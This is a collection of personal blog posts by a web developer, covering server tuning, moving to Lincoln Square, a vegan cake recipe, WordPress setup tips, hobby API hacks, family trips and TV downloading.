<p>Since I really didn&#8217;t want to test eAcellerator on threadless (yea know.. money, transactions and the like), I decided to give it a test run on my own server. I went ahead and compiled it, installed it and restarted apache. BAM. immediately my load was down: <blockquote>10:34:01 up 46 days, 16:05, 1 user, load average: 0.87, 3.82, 7.22</blockquote> You can see that 15 min ago - the load was almost 7. This is what it has been for the past 2 months. Constantly pegged above 5. it was making me insane. So just seeing apache running and a load of 0.67 made me grin. It has been 2 hours now and I am still seeing great performance from eAccelerator: <blockquote>12:40:32 up 46 days, 18:12, 1 user, load average: 0.33, 0.40, 0.37</blockquote> It is pretty amazing. I mean - opcode caching is really a no-brainer. It is easy and makes sense. And anytime you are running a language like PHP, you will need to think about caching the compiled code rather than recompile on every request. I don&#8217;t know why I didn&#8217;t do this earlier.</p>

<p>My only worry is that the opcode cache will not clear fast enough during edits. I did some testing and it seemed to be pretty quick. I didn&#8217;t notice any stale scripts or negative impact. Apparently eAccelerator is <a href='http://www.ipersec.com/index.php?q=en/bench_ea_vs_apc&amp;page=0%2C3'>pretty good at handling updates to its opcode cache</a>.</p>

<p>So far - ALL of my sites are quicker. nice work.</p>

                <p>I know I know. I have been a bad bad blogger. I basically I have been ignoring the fact that I have a blog. For a long time - - pretty much since I got back from japan at the beginning of January. eep. What weird is that I have been playing computer a lot - but mostly doing workish things. it made it hard to justify blogging when I had 100 things on my plate. whoops. But now things have settled down a bit. I feel a more static, and I don&#8217;t think that everything is going to blow up. Its nice to breathe!</p>

<p>This month has been manic change month. I got rid of at least half of my stuff, Hiromi moved back to Chicago, Hiromi and I got a new place, I moved, and we now have a nice apartment together. Its really nice. We moved from Logan square to Lincoln square (we are such squares) and we love the new neighborhood. It will be a lot nicer in the summer when don&#8217;t have to be so cold and walk through this inclement weather. SOON.</p>

<p>Our apartment is only around 6 blocks from skinnyCorp - so my commute is much better than the 2 hours I was commuting with CTA buses. OMG. I am so happy about that change. The one thing that I am unhappy about - is now I have &#8220;less&#8221; forced time to read. I now have to make myself read at home - since I no longer have to sit on a bus for 2 hours a day. heh. War and Peace is going to take forever to get through. hah.</p>

<p>We are slowly getting our apartment back together. We don&#8217;t have a lot of furniture - which is nice. Both Hiromi and I like it when it is minimal and nice. Our place is pretty cozy - but since its just the two of us it is just right. I can&#8217;t wait for better weather so that we can hang out in the sun room. It will be my reading nook.</p>

<p>In regards to technology - I am dropping one of my colocated servers and getting a little more interesting hosting plan for hosting friends. Its on <a href='http://mosso.com'>mosso</a> which is one of those fancy &#8220;clustered&#8221; hosting systems. But it is a rackspace company and not evil. So far it has been amazing. This time I plan to actually invoice people which will revolutionize my hosting abilities. It has been fun and crazy trying to move 100 domains and 25 clients in a week. hah. stupid hardness. But it will be worth it when I save around $400 a month in hosting fees.</p>

<p>So that is pretty much it. I am really happy Hiromi is here with me. We are happy.</p>

<p>happy valentines day. and <a href='http://dylanreed.org'>happy birthday Dylan</a>! <p class='wlWriterSmartContent' id='0767317B-992E-4b12-91E0-4F059A8CECA8:651f32fe-5423-4a3f-944b-2f58df1930dd' contenteditable='false' style='margin: 0px; padding: 0px; display: inline'>[tags]dylan, hiromi, valentines day, moving, chicago, cta, buses, skinnycorp, lincoln square, logan square, servers, mosso[/tags]</p></p>

                <p>So at lunch today we were talking about vegan food and I remembered this excellent vegan chocolate cake recipe that my family made for the holidays. It is so good. I remember when we had bunches of non-vegan cakes and pies - this one was always the first to get eaten (the majority of my family is not vegan). Soo good. Anyway - here is the recipe - straight from my mom: <pre class='markdown-html-error' style='border: solid 3px red; background-color: pink'>REXML could not parse this XML/HTML: 
&lt;blockquote&gt;&lt;strong&gt;Chocolate Vegan Cake &lt;/strong&gt;</pre></p>

<p>Ingredients: <ul>
	<li>1 1/2 cup flour</li>
	<li>1/3 cup cocoa powder</li>
	<li>1 teaspoon baking soda</li>
	<li>1/2 teaspoon salt</li>
	<li>1 cup sugar</li>
	<li>1/2 cup vegetable oil</li>
	<li>1 cup cold water</li>
	<li>2 teaspoons vanilla extract</li>
	<li>2 teaspoon vinegar</li>
</ul> Directions: Preheat oven 375 degrees. Use small brownie sized pan, (no greasing required.) Mix all dry ingredients right in pan. Mix all wet ingredients in a separate bowl EXCEPT VINEGAR, (IMPORTANT.) Add wet ingredients to dry and stir until all dry ingredients are mixed. Add vinegar quickly and stir in &#8212;&#8212;immediately put in oven and bake for 25 to 30 minutes. Cool and then EAT!</p>

<p>Have a happy day!&lt;/blockquote&gt; I hope you like it. I have posted the recipe to Google docs - you should always be able to get the latest version (with any additions my mother or Hiromi makes) by visiting the <a href='http://docs.google.com/View?docid=dfdn2nj9_55jh4wq4'>most recently published version</a>.My mother offers that it is really good with frosting (if you are not vegan). Let me know how it turns out.</p>

                <p>So Jake asked me about Microsoft&#8217;s new <a href='http://www.microsoft.com/windowsvista'>Windows Vista</a> and whether we should look into getting it. So we looked at the website to see when it comes out and wtf - it doesn&#8217;t say. hah. It totally says that the <a href='http://www.microsoft.com/windowsvista/getready/wow.mspx'>countdown starts now</a>, but it doesn&#8217;t tell me when the countdown ends. What a horrible website. Jake thought it was a spam site at first and only from it being at the domain Microsoft.com made it not. There is no information at the website - except for the Vista pricing.</p>

<p>Vista is really expensive. I mean - it isn&#8217;t $1000 bucks or anything, but it is not cheap. Microsoft is attempting to be the &#8220;cool&#8221; company and appeal to consumers with its XBOX and all that - but they are so out of touch. The vista pricing is quite a bit more than any consumer OS out there: <blockquote>Vista Pricing:
<ul>
	<li>Vista Home basic: <a href='http://www.microsoft.com/windowsvista/getready/editions/home_basic.mspx'>$199</a></li>
	<li>Vista Home Premium: <a href='http://www.microsoft.com/windowsvista/getready/editions/home_premium.mspx'>$239</a></li>
	<li>Vista Business: <a href='http://www.microsoft.com/windowsvista/getready/editions/business.mspx'>$299</a></li>
	<li>Vista Ultimate: <a href='http://www.microsoft.com/windowsvista/getready/editions/ultimate.mspx'>$399</a></li>
</ul>
Other OS Pricing:
<ul>
	<li>Ubuntu Linux: <a href='http://www.ubuntu.com/'>$0</a></li>
	<li>Apple OSX Tiger: <a href='http://store.apple.com/1-800-MY-APPLE/WebObjects/AppleStore.woa/wa/RSLID?mco=405B1455&amp;nplm=MA453Z%2FA'>$149</a></li>
	<li>Apple OSX Tiger (5 Licenses): <a href='http://store.apple.com/1-800-MY-APPLE/WebObjects/AppleStore.woa/wa/RSLID?mco=405B1455&amp;nplm=MA453Z%2FA'>$199</a></li>
</ul>
</blockquote> That is insane. It is so expensive. How do they expect people to afford to buy that. Especially when Linux is free and OSX Tiger is one price. The other thing which is annoying is that their are <a href='http://www.microsoft.com/windowsvista/getready/editions/default.mspx'>different versions with possibly different functionality</a>. The Vista home basic version doesn&#8217;t have near the functionality as the Vista Home Premium. That seems screwed up - especially when buying OSX you get the same - whether it is for business or for home.</p>

<p>All of this just begs people to pirate Windows Vista. It will be so much easier to have the local <a href='http://thepiratebay.org/search.php?q=%22windows+vista+ultimate%22+x86+DVD'>14 year old super nerd</a> give you his &#8220;copy&#8221; of vista than it will be to go to best buy and find out which version is right for you and then shell out 200-400 bucks. I mean - you can almost get a <a href='http://www.apple.com/macmini/'>Mac Mini</a> for the price of Vista Ultimate. Wtf.</p>

<p>Obviously Microsoft is not with the program. But they will probably make a lot of money not being with the program by exploiting the unknowing non-computer friendly people of the world. I guess we will have to wait until the countdown is over to see what happens in reality. I hope that more people move to Macs. Wtf is Microsoft thinking&#8230;</p>

                <p>I am a blog advocate. I am often pushing my friends to get blogs and to update them. I love reading about how my friends are doing and what is going on in their lives and with their friends. It is such a nifty way to stay in touch. I know from my own experience how rewarding blogging can be. How it can create connections with people who normally would never be connected. I love it. So with that said - I am constantly helping friends set up blogs. And now I have it down to a science. I have figured out how to use wordpress and a couple plugins to create the perfect blogging environment for n00b bloggers. here is how it goes:</p>

<p>So the first step is a domain. I always suggest to my friends that they get a domain. I, of course, always offer a subdomain of penisfighter.com - but they usually take the domain route. I suggest using <a href='http://joker.com'>joker.com</a> because of their DNS and web interface being pretty solid; but I have had good experience with pretty much everyone. The one trick for registrars that don&#8217;t have their own DNS is to use the free DNS over at <a href='http://www.everydns.net/'>everydns.net</a>. Its a pain in the ass to set up, but works really well. Quite a few of my friends use it for their sites and like all server based services, they only complain when it is down (which is luckily not very often).</p>

<p>So you go to <a href='http://joker.com'>joker.com</a> and you register joeblow.com. Then you are stuck with a domain and no place to put it. So you have to get hosting. Well this isn&#8217;t to hard - if you are friends with a nerd who has a server, then ask them. Otherwise you will have to settle for something like <a href='http://www.dreamhost.com/r.cgi?159982'>dreamhost</a> or if you are insane, <a href='http://www.google.com/search?q=%22mediatemple+sucks%22'>mediatemple</a>. I tend to stay away from the bigger guys. they seem to fuck people over well. although I have friends who have hosted with <a href='http://godaddy.com'>godaddy</a> with great happiness.</p>

<p>So then you have hosting and you need to do something with your domain. This is where I really have the formula down pat.</p>

<p>So the first thing I do is go to <a href='http://wordpress.org/download/'>wordpress and download</a> the latest version. It is really easy to remember that the tar is always located at: <a href='http://wordpress.org/latest.tar.gz'>http://wordpress.org/latest.tar.gz</a>. I download it using wget, and the extract it into the web dir. I usually then move all the wordpress files into the root - but whatever you want to do is fine. I then setup wordpress so that it is at a point where it works. You can get <a href='http://weblogs.about.com/cs/tutorials/ht/wordpress.htm'>more info about setting up wordpress here</a>.</p>

<p>Once its set up and working I go in and do the following: <ol>
	<li>Create another user to be the main blog author - I do this so that their is an admin user that can control and modify everything and then the main blog author can't fuck up the blog.</li>
	<li>I change the permalink structure to be name based - I do this so that Google and other search engines can find your blog easier.</li>
	<li>I enable the askismet spam plugin - This made blogging fun again. USE IT.</li>
</ol> Then after the initial tweaks are set up I move on to the trickier part (and by tricky I don&#8217;t mean hard, I just ran out of words).</p>

<p>So most of the people who I host wordpress blogs for are really interesting in showing photos and what not besides their well crafted prose. I used to think that having all my photos on my personal server was an awesome way to go about it, but then I discovered flickr and would never go back. So I MAKE everyone go <a href='http://www.flickr.com/signup/'>get a flickr account</a> and then install the <a href='http://www.randombyte.net/blog/projects/falbum/'>Falbum plugin</a> so that it appears that their photos are on their site and not flickrs. It is one of the better wordpress plugins out there. I have been using it for a minute and really like how easy it is to use/configure and maintain. All you have to do is authorize it and then go to the options and tweak how you want it to look. I make sure that the URL scheme is using friendly URLs, so that the photo album is easy to find and easy to link to.</p>

<p>Once that is done I used to tell people to go to the <a href='http://codex.wordpress.org/Using_Themes/Theme_List'>theme list on wordpress.org</a> - but that got annoying. Like all &#8220;clients,&#8221; friends who are getting blogs are never able to make up their minds and totally unprepared for choosing one theme among hundreds. So now, I just download the <a href='http://blogtheinternet.com/2006/09/04/wp-widgets-ready-theme-pack-download/3/'>widget friendly wordpress theme pack</a>. heh. Then I just install all 100 or so themes. This way - there is no limit to the design potential of the new blog. And they will all be ready and able with widgets. I figure that hosting 50M of themes is the compromise I am willing to take for not hosting pictures and media. heh. Then I download and enable the <a href='http://automattic.com/code/widgets/'>widget plugin</a> so that the future blogger can customize the theme a bit. And I am about done.</p>

<p>What the fancy new blogger ends up with is a really awesome fully customizable blog that is able to have pictures, entries and all that. It has the ability to look different than a lot of blogs out there and is running good software and is easy to use. And to make it even easier - if the potential power blogger is on windows, I suggest they use <a href='http://windowslivewriter.spaces.live.com/'>windows live writer</a>. That program makes blogging so easy. I love it.</p>

<p>So then I have a new friend with a new blog. I then add the feed to my <a href='http://blogs.nata2.org'>friends blog list</a> and then push then out the door, out into the wild world of blogging.</p>

                <p>The <a href='https://www.theveniceproject.com'>Venice Project</a> is a P2P social television project by the guys who made <a href='http://skype.com'>Skype</a>. They are really into disruptive technologies and I am excited to be a part of the beta. You can get more information at the <a href='http://en.wikipedia.org/wiki/The_Venice_Project_%28software%29'>Venice Project wikipedia page.</a></p>

<p>I am pretty excited to see how it goes. I played with it a second here at work - but yea know. watching television at work isn&#8217;t really the best way to get things done. So far it looks good. The picture quality was really nice on my 23&#8221; cinema display - so I am impressed from perspective. I wonder what it will be like on a worse computer. I will have to play with it a bunch later and at home.</p>

<p>Someday I will have invites to invite yall.</p>

<p>I think the P2P television space is really neat. It offers a lot of interesting solutions to a pretty common problem: how can I get good entertainment quickly and inexpensively. I think that the actual P2P technologies like the Venice project and some others is much better than democracy and bittorrent based solutions. It is a quicker and more ADD compliant way to get television.</p>

<p>I am happy to see how this turns out. It will be nifty if this could hook into <a href='http://www.mythtv.org//'>Myth TV</a>, <a href='http://www.xboxmediacenter.de/'>Xbox Media Center</a> or <a href='http://www.apple.com/appletv/'>iTV</a>. heh.</p>

I went in to the movie with no expectations and had no idea what it was about nor what the idea or political message behind the movie was. </p>

                <p>So I just got back from visiting Hiromi's relatives in the Yamanashi prefecture. We had a big New Years celebration and had a lot of fun. As you may or may not know, in Japan, New Years is quite big. It is a lot like a combination of Thanksgiving and Christmas. So while I was away for New Years, I had no access to the Internet. For almost 4 days. It was really neat. I didn't think about email or my servers or work or anything for 4 days.&nbsp; well... maybe 3 days.. the last day I was starting to get a bit antsy - but I made it. </p>

Apparently they didn't get the proper customer response that they wanted. So they are discontinuing it in the end of 2006. Sad. </p>

                <p>So the other day I was at home with my parents and my grandfather. We were passing the time and decided to watch a movie. I picked one of my favorite movies, <a href='http://imdb.com/title/tt0190590/'>O Brother Where Art Thou</a>, because I love it and I thought&nbsp;my grandfather would enjoy it. He did. We all watched it and laughed a bunch. So then when I got home, I did a bunch of research on who the music was by and what not and found that most of the music from the movie is from the bluegrass band called The Stanley Brother. So I grabbed a bundle of their stuff off of <a href='http://phobos.apple.com/WebObjects/MZStore.woa/wa/viewAlbum?id=863533&amp;s=143441'>itunes</a> and have listened to it ever since. It is quite something. I like how sad and dark it is. So nice.</p>

                <p>So I love playing with fancy things. And twitter is one of those fancy things. In fact - it has been on my mind quite a bit. Like I said a couple posts ago, I have been thinking about writing a utility that will set your IM status based on your twitter update. It will be awesome. But in the meantime I whipped up a quick hack to help yall hook your twitter into your IRC application. </p>

                <p>Everyone at worked has been talking about <a href='http://imdb.com/title/tt0411008/'>Lost</a> incessantly since I started working at <a href='http://skinnycorp.com'>skinnyCorp</a>. It was driving me mad - mostly because they kept talking about all sorts or interesting things. Things that didn't make sense and it was completely infuriating. I was completely taken in, without even seeing or knowing anything about it. The final straw was the <a href='http://en.wikipedia.org/wiki/The_Lost_Experience'>alternative reality game</a> the <a href='http://www.4815162342.com/forum/viewtopic.php?t=23291'>Lost people</a> put on. It was absolutely madness. I love viral marketing and that was amazing. It was so deep and incredible. And after <a href='http://jacobdehart.com'>Jacob</a> sent me links to all the websites and what not I decided I had to watch it. sadly I didn't want to just jump in. I needed to start from the beginning. </p>

                <p>Tonight after work I decided to whip up a quick <a href='http://www.twitter.com'>twitter</a> client in C#. I love C#. It is so fun and easy. I have never done web work in it, but love writing applications. So tonight I just sat down and slugged through the idea.</p>

<p>You can check it out at: <a href='http://flashandburn.net/twapp'>http://flashandburn.net/twapp</a></p>

<p>The idea behind the client is a small application that will sit in your taskbar and constantly update you on your friend timeline. It will also allow you to easily update your timeline without upsetting your flow. It isn&#8217;t as feature full as i wanted it - but soon it will be more so. It works pretty good and doesn&#8217;t have TOO many bugs.</p>

<p>This is the prelude to the REAL twitter app i want to make - which will take your twitter status and update all your IM clients with that status. This way you can set your IM status from away. If anyone knows a decent way to write GOOD gaim plugins without me brushing up my C++ skills - let me know (and using perl is not a good way, its a solution - but i want style and pretty things).</p>

<p>Ok. I need to go home and eat FOOD!. This is the first blog post in awhile that i didn&#8217;t use the window live writer for.</p>

                <p>So my <a href='http://jimknox.org'>grandfather</a> is older. He isn't 1000, nor is he 150. But he is up there. Maybe around 75ish. But he is pretty spry and active. He is, in fact, the mayor of his <a href='http://www.burlingtoncolo.com/'>town</a>. So the other day when I was in Colorado - he mentioned how he was needing to get his emails up, how he needed to be able to get and receive his important mayoral emails. Right after talking with my grandfather about email, my parents both got <a href='http://www.palm.com/us/products/smartphones/treo700p/'>Treo 700p</a> phones from verizon. They are really nice, and have a really great embedded email client. So they were able to send email quickly and send text messages easily. This was much different than before when they were not able to do either without being in front of their email client. Now they were able to do both and with ease. It reminded me of when <a href='http://hirominakazawa.com'>Hiromi</a> explained how a lot of people who email each other in japan do it not on a computer but on their phones - and they may not know how to use a computer, but they can email anyone in the world just fine. </p>

Where it seems like nobody is helping. And since its financial - it is hard to find help without sacrificing something yourself. I hate that feeling. I think that the hardest part about living in this society is trying to exist when you don't&nbsp;have money. </p>

                <p>After a really nice long week in Colorado I am sadly back in Chicago and back to work. We had a fun time. I got in two Fridays ago.</p>

<p>I arrived in Colorado the Friday before thanksgiving. My plane was arriving late - so my brother and his wife Sarah picked me up. We then drove to Burlington to meet up with my parents and relatives at my grandfathers house. We got to Burlington late so I didn&#8217;t really get a chance to hang out much - but I did get a chance to see my parents <a href='http://flickr.com/photos/natatwo/301188412/'>new dog ellie</a>. She is really cute.</p>

<p>Then on Saturday we all got up and hung out. We <a href='http://flickr.com/photos/natatwo/301342269/'>tasted the Jones' soda thanksgiving soda</a> and decided it was nasty. I also hooked my grandpa up with a Google apps for domains account for his <a href='http://jimknox.org'>jimknox.org</a> site. It is so easy. I love it. In the afternoon I my aunt Heide brought her kids over and we hung out. I accompanied them to the Akron vs. Burlington football game. It was a football game. I am glad I am not in high school. So <a href='http://flickr.com/photos/natatwo/301334560/'>Kile, Kory</a> and I walked back to my grandpa&#8217;s house to see what was going on.</p>
<a href='http://www.flickr.com/photos/natatwo/301337285/' title='Photo Sharing'><img src='http://static.flickr.com/108/301337285_a66d843611_m.jpg' height='180' align='right' alt='We bought a lot of diet coke' width='240' /></a>
<p>So we gathered everyone up for the big Mentos bottle fountain. We did a couple sets. it was pretty insane, as usual. I love the Mentos diet coke reaction. Always funny. We <a href='http://youtube.com/watch?v=dWO4A70K89s'>somehow convinced Kile</a> to get under one of the reactions and get all &#8220;popped&#8221; up. Pretty funny.</p>

<p>After that we pretty much just chilled out and had a nice thanksgiving dinner. It was pretty funny. The food was excellent and it was nice to see all my cousins and uncles and aunts. The best part was hanging out with my relatives and telling jokes. Their were some good ones. All pretty unique and interesting. Hilarious.</p>

<p>Then everything wound down. Everyone went to bed and I stayed up and finished the Count of Monte Cristo. It was amazing. Right now I LOVE books with counts and countesses. hah. I think I see a War and Peace in my midst.</p>

<p>So then on Sunday - we went back to Greeley. My parents mentioned that they wanted new phones so I convinced them to get Treos from Verizon. I think they really like them. They both really like palms so it was nice to have a phone with a minimal learning curve. The Treo is super fast. Pretty amazing. The one thing I don&#8217;t like is how they minimized the hotsync portion. They should have had a conduit that worked with their custom PIM. that would have made more sense for people like my mom who is using a mac. Anyway. we got Treos and hung out. <a href='http://flickr.com/photos/natatwo/302982712/'>played Treos</a>.</p>

<p>On Tuesday, I went to the dentist. Fun Fun. Then met up with my friends <a href='http://megan.watership.org'>Megan</a>, <a href='http://proxientunit.org'>Mike</a>, <a href='http://manifolding.com/'>Sam</a> and <a href='http://thom.watership.org'>Thom</a> in Denver for a nice vegan dinner. We went to <a href='http://www.watercoursefoods.com/'>watercourse</a>. It was great. I had a buffalo chicken sandwich (of course with no chicken) and a really good soup. It was really cool to see everyone. I hadn&#8217;t seen Thom in years - so that was especially cool. I really think that he is a secret agent working for the government. That would make more sense to me. hah. After dinner we went back to Mike and Sam&#8217;s place for a nice hang out/Internet groove time. Great fun. I miss those kids.</p>

<p>On Wednesday I had dinner with my family and then went with <a href='http://flickr.com/photos/natatwo/303807949/'>Dylan and my Mom to get some fabrics for our capes</a>. It was awesome. We hung out at Joann&#8217;s for about 2 hours. just playing around. Then on the way back we were headed to the grocery store and Dylan threw our list out the window. always a joker. hah. So we scratched the grocery store idea, went home. Hung out with my newly arrived grandfather and then made capes and watched movies. hah. fun.</p>
<a href='http://www.flickr.com/photos/natatwo/305820650/' title='Photo Sharing'><img src='http://static.flickr.com/102/305820650_045be07a62_m.jpg' height='180' align='left' alt='Elle and her cape' width='240' /></a>
<p>On Friday, Dylan came over and we all made capes. ALL DAY! it was really fun. We made a lot capes. 19. really awesome. My mom was the rockstar. She made the shit out of some capes. Dylan also really rocked out. All I did was cause problems and then embroidered a bunch of stuff. It was petty cool.</p>

<p>Then on Saturday we had the day of days. The reason I came to Colorado. The reason for living. We invited our family friends Wes and Amy to come out to Greeley with their children for a quick fondue date and to shoot rockets. Tom and his brother Joe and Joe&#8217;s family also came out. We all hung out and then went to our friends alfalfa farm to shoot rockets. It was pretty insane. Tom brought his giant rocket that used F and G engines. We shot it off a bundle of times and generally had a good time. We even made a rocket out of bread. It was awesome. I made a really shoddy <a href='http://youtube.com/watch?v=5q6l2bl8G9o'>movie and posted it</a>. It was really fun. After the rocket day, we came back to my parents house and hung out, ate awesome food, played with kids and just chilled out. It is nice to talk and hang out with great people. I miss them already.</p>

<p>Sunday came too quickly. On Sunday, we had brunch with my brother and Sarah. It was fun. Dylan and I talked about Internet and clowns and did a small amount of juggling. I love juggling with Dylan. So then they left to visit Sarah&#8217;s dad and my parents and I ran some errands, went to the bookstore and went and had steaks. My father recommended the Prayer for Owen Meany by John Irving. I love it. Very funny.</p>

<p>I then flew back to Chicago and WORKED! So there we are.</p>

                <p>So last night after watching movies with my parents and making capes with my mom, I decided to redo my code repository/misc directory site that was at <a href='http://nata2.info/'>nata2.info</a>. I decided that I needed to make my code repository a bit more "official" - so I moved everything that was at <a href='http://nata2.info/'>nata2.info</a> over to <a href='http://stuff.harperreed.org'>stuff.harperreed.org</a>. Then&nbsp;I rewrote the blorp script that was powering the repository using PHP and smarty. I used the <a href='http://pear.php.net/package/Text_Highlighter/'>Pear TEXT/Highlighter</a> class to colorize the source code. It is pretty awesome. </p>

                <p>I have been hosting blogs for my friends for quite awhile. Its a lot of fun. I love reading them and trying to get them to blog more. It is a neat way to learn about people and see what they have been up to without being constantly in touch. It is especially good for friends that are away or travel and all that. So I starting hosting peoples blogs using <a href='http://en.wikipedia.org/wiki/Greymatter'>greymatter</a>. Then I moved to <a href='http://movabletype.com'>movable type</a>. Then I moved to <a href='http://www.wordpress.org'>wordpress</a>. and now I am moving to <a href='http://mu.wordpress.org/'>wordpress MU</a>. </p>

                <p>Tomorrow is the 2006 General Election. You need to vote. It is very important. I think voting is very exciting. Even though I am sometimes bummed by the outcome - I love participating in our countries politics and influence policy. It rules. I have voted in every election since I was able to first vote in 1996. And it is still a little bit magic to get in line and do whatever you need to do to submit your vote. Its like being a cog in a machine. a machine of.....&nbsp; GOVERNMENT. </p>

                <p>I was thinking about how I have a lot of domains that are not being used and how that pisses me off. It is annoying to have a domain that costs 12 bucks or whatever (stupid joker) and isn&#8217;t making money - when I could. And a lot of times I am not really mad about it not making money - just mad it isn&#8217;t being used. I wish I either had a lot of energy, money, or an extra arm to finish all the sites I want to. So Thursday night I decided to do something with one of my domains. So I took <a href='http://fukung.net'>fukung.net</a> - which was supposed to be a Hong Kong cinema wiki - and turned it into a fun face to the <a href='http://nata2.info/?path=humor/pictures'>nata2.info picture archive</a>.</p>

<p>I made it really simple. Made it easy to add tags and find pictures. Made it easy to send the images to a friend. I also made it so I can track which picture is the most popular. Hopefully it will take off and people will use it like they use nata2.info. That would be nice. So <a href='http://fukung.net'>check it out</a> - I end up spending hours viewing it. hah. a lot of the pictures are horrible - but really funny. hah.</p>

Wikipedia is special because it allows people to contribute their knowledge to the general content base. This is awesome. This alone is enough of a differentiation to make Wikipedia the choice for the new generation. But wtf can't they solve simple usability issues? Simple things even.. </p>

                <p>Ahh Halloween. How I love the city during Halloween. It is absolutely madness. This Halloween was quite a bit of fun. Not as crazy as last year - but more fun. On Friday skinnycorp had a nice Halloween party that I was responsible for. We had mark the knife perform and some <a href='http://flickr.com/photos/natatwo/281089524/in/set-72157594350220283/'>really awesome costumes</a>. The only bummer part was that I didn't get dinner and ended up getting <a href='http://flickr.com/photos/natatwo/281143395/in/set-72157594350220283/'>rather drunk</a> toward the end of the night. It was awesome though. <a href='http://youtube.com/watch?v=aLliduShY6c'>Jacob had knives thrown at his face</a> and we all laughed a lot. Except for Charlie; who found the bar much more entertaining than a world famous juggler. lame. </p>

                <p>I realized a minute ago that I haven't looked at <a href='http://slashdot.org'>slashdot</a> in a month. That is really screwed up. I have been looking at slashdot for years. truly since the beginning of slashdot. I remember when they added users (I think). It has always been around. However, I just haven't been going to the site.&nbsp; I have been reading del.icio.us or digg instead. its more rounded. I am less interested in news for nerds and much more interested in news. I also found that slashdot's annoying editorialization of the articles and their poor authors was getting in the way of what I really wanted - which is the cool like and awesome stories. I also liked the discussion - but slashdot was so full of nonsense that I had to read the comments on a +3 or +4 threshold. annoying. </p>

<p>It is an interesting idea and I know that in my world - if someone wrote me a nice letter with some diagrams and information on how to make my sites better - I would listen.</p>

<p>So get out your sharpies and mark up some magazine - mail it to the editor and look in the forthcoming issues to see if you can see your influence. I bet you will.</p>

Now that I can hang out on the Internet - work is starting to seem more like work and less like a crazy place. Everything is starting to come together. I can't wait for our office to be done. Its going to be awesome when we get our conference room, tables and other furniture. </p>

Its amazing what a change of ~10k square feet can make. We started on Thursday packing and prepping the new space. Building <a href='http://flickr.com/photos/natatwo/259827844/in/set-72157594311484628/'>racks</a>, and generally fixing up the <a href='http://flickr.com/photos/natatwo/259809044/in/set-72157594311484628/'>new space</a> for our big moving day. Then on Friday the movers arrived and we all bundled up the shirts and rocked out. I was lucky and <a href='http://www.flickr.com/photos/natatwo/262508058/in/photostream/'>had to set up</a> our adhoc (not as in computer to computer - but as in not planned) wifi network. It is actually really fast and quite nice. So Friday went well. We have <a href='http://flickr.com/photos/natatwo/262417198/in/set-72157594311484628/'>SOOO many boxes of shirts</a>. It was pretty insane. </p>

                <p>So I canceled directTV awhile back and have been struggling to figure out how to easily download the shows I want to watch. I would love to do it legally. I have looked into the itunes solution - but they don&#8217;t have all I need/want. And it won&#8217;t work for hiromi - in japan. So I needed something that wasn&#8217;t region specific and something that wasn&#8217;t hard.</p>

<p>With these requirements I poked around quite a bit. Having looked into <a href='http://www.azaurus.com/'>azaurus</a> and <a href='http://www.bittorrent.com/'>bittorrent</a> with RSS. It was a pain and I couldn&#8217;t possibly use it regularly. I also have terrible luck over time with azaurus. It rules when I have time - but when I leave for a week and comeback to it - I have no idea what&#8217;s going on. So - I then looked into DDL sites. They were lame and too much work. So annoying.</p>

<p>I had great hope in the allsimps.com site. But it was taken down. weird I know.</p>

<p>Finally after looking and looking - I found what I was looking for in a video client that I had already looked into. I had originally downloaded and played with the Democracy video client years ago. It wasn&#8217;t very intuitive. Or maybe I wasn&#8217;t into it. But regardless - I left it installed and then stopped using it. Then a week ago I read the <a href='http://lifehacker.com'>lifehacker</a> article about using <a href='http://lifehacker.com/software/bittorrent/hack-attack-get-your-tv-season-pass-with-democracy-204057.php'>Democracy and TV RSS feeds to stay updated on torrents of your favorite TV shows</a>. All seamlessly. it is pretty dope.</p>

<p>This is what I have done (it is outlined in much greater detail in the lifehacker article): <blockquote>
<ol>
	<li><a href='http://www.getdemocracy.com/'>Download</a> and install the democracy client</li>
	<li>Find your <a href='http://tvrss.net/shows/'>favorite TV shows</a> at <a href='http://tvrss.net'>tvRSS</a></li>
	<li>Add the RSS feed from the TV show listing to democracy</li>
	<li>Hang out for a minute (go outside and juggle)</li>
	<li>Watch your shows</li>
</ol>
</blockquote> I was taking about 30min to download each show - with some taking much longer. It seemed that it was reasonably fast - especially when ran at night. I now just have to remember to watch the shows. Luckily democracy will delete old and watched shows after a specific duration.</p>

<p>So now I can watch TV on any of my laptops. I do wish I could throttle the Democracy player a bit more. It seems that having it run only at night would be a good plan. The coolest part about the player is how it is a bittorrent client as well as a player - so the problem of people closing their clients after they are done downloading an episode is a bit diminished. woot.</p>

<p>I guess the next step is trying to get <a href='http://torrentocracy.com/documentation.shtml'>this integrated</a> into a <a href='http://www.mythtv.org//'>MythTV</a> box. I think that would be excellent. And after hacking the <a href='http://en.wikipedia.org/wiki/Tivo#Controversies'>Tivo</a> to all its ends - I think its time to <a href='http://www.lifehacker.com/software/dvr/hack-attack-build-your-own-dvr-165963.php'>roll my own PVR</a>. heh.</p>

<p>So check it out over at <a href='http://flashandburn.net/youtubeBadge/'>flashandburn.net</a>. As far as i know - it is the first badge of its kind.</p>

<p>I have decided to place all my awesome and quick hacks over at flashandburn.net. I think its a decent place. In the last couple days i have created a programatic youtube gallery/videolist generator. Its pretty hilarious. I do like apis. It makes a lot of neat little gadgets able to be made. I have some ideas. I am thinking about making a JS include flickr gallery and or youtube gallery for your enjoyment. But nobody knows&#8230; Probably something silly. wait and see.</p>

<p>Also - let me know if this badge works for you. I have only tested it sporadically.</p>

Jesus Christ that movie is insane. I was not ready for the endeavor of watching that movie. Quite something. I rather enjoyed it. I am a sucker for movies that have good soundtracks. The story blew my mind. I had no idea it was going to become what it became. Whew. I have owned it for a number of years and just finally got around to watching it. I am glad i did. I just ordered the &#8221;<a href='http://en.wikipedia.org/wiki/The_Count_of_Monte_Cristo'>The Count of Monte Cristo</a>&#8221; - so we shall see how it compares. Even though oldboy isn&#8217;t a direct transposition of the story, i wonder about the plot of the story versus the movie. and what similarities their are. Man. what a rough movie.</p>

                <p>Man. Today was pretty awesome. Woke up. Juggled. Ate good food. And wrote some dope PHP stuff.</p>

<p>After reading a bunch about some peoples PHP <a href='http://www.youtube.com/dev'>Youtube API</a> implementation, I decided that i was tired of looking at some other peoples crappy and over complicated code. So i whipped up something that is really easy, works and is a class. I posted the code over at nata2.info - <a href='http://nata2.info/?path=code%2Fyoutube_api'>so check it out.</a></p>

<p>I am warning you - it was written fast and dirty. I know it work, but i haven&#8217;t tested all the functions. heh. just the ones I needed. I think the idea of writing code and not testing it is hilarious.</p>

<p>So after I wrote the class i made a quick and really stupid hack that I posted at flashandburn.net. <a href='http://www.flashandburn.net/youtuber/'>Check it out.</a></p>

